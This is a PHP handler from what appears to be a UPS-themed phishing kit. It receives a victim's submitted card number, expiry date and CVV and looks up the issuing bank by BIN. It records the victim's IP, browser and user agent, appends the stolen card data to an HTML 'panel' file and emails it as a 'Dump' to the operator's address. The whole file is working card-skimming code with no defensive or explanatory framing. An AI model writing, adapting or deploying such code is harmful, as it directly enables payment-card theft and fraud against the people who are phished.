<?php
@ini_set('display_errors', 'on');
require 'detect.php';
include "setting.php";
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
if(isset($_POST['ccnumb'])&&isset($_POST['expr'])){session_start();
$ccn104=str_replace(' ','',$_POST['ccnumb']);
$cex105=$_POST['expr'];
$csc106=$_POST['cvvz'];
$brow = $_SESSION['browser'];
$sys = $_SESSION['os'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$ecran = $_SESSION['computer'];
//$ctp=$_POST['cctype'];
$x2 = $_POST['ccnumb'];
$bin = $_POST['ccnumb'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);
$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = $xBIN["scheme"];
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$bnk = $_SESSION['bank_name'];

$msg= '
【💳 CC - '.$code.' - '.$IP.'】

[👤 Full Name]  = '.$_SESSION['fnm101'].'

[💳 CC Number] = '.$ccn104.'
[🔄 Exp Date ]       = '.$cex105.'
[🔑 CVV ]               = '.$csc106.'

[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].'
[💳 Card ]         = '.$_SESSION['bank_scheme'].'

【💻 System】
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🖖 FINGERPRINT] = '.$useragent.'
【UPS - '. $alias .'】';
$msghtc = '
			<tr>
			<td width="80">
			<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">' .$IP.'</td>
			<td width="80">
			<p align="center"><code>'.$_SESSION['bank_scheme'].'</code></td>
			<td width="40">
			<p align="center">'.$fnm101.'</th>
			<td width="60">
			<p align="center">'.$ccn104.'</td>
			<td width="40">
			<p align="center">'.$cex105.'</td>
			<td width="20">
			<p align="center">'.$csc106.'</td>
			<td width="40">
			<p align="center">'.$_SESSION['bank_type'].'</td>
	        <td width="40">
			<p align="center">'.$_SESSION['bank_brand'].'</td>
			<td width="20">
			<p align="center">'.$_SESSION['bank_name'].'</td>
			<td width="60">
			<p align="center">'.$times.' / '.$date.'</td>
			</font></td></tr>';
$save2=fopen("../../panel/cc".$namerand.".html", "a+");
fwrite($save2,$msghtc);fclose($save2);$anti = $msg;
$subject  = " Dump / ".$IP." / ".$cnt." BILL ";
$headers .= "From: SUPER 'D' UPS v1" . "\r\n";
mail($yourmail, $subject, $msg, $headers);
$last = substr($x2,-4);
$_SESSION['ctype']=$_SESSION['bank_scheme'];
$_SESSION['last']=$last;
$_SESSION['bnk']=$bnk;
$_SESSION['anti']=$anti;
include("api.php");
}


?>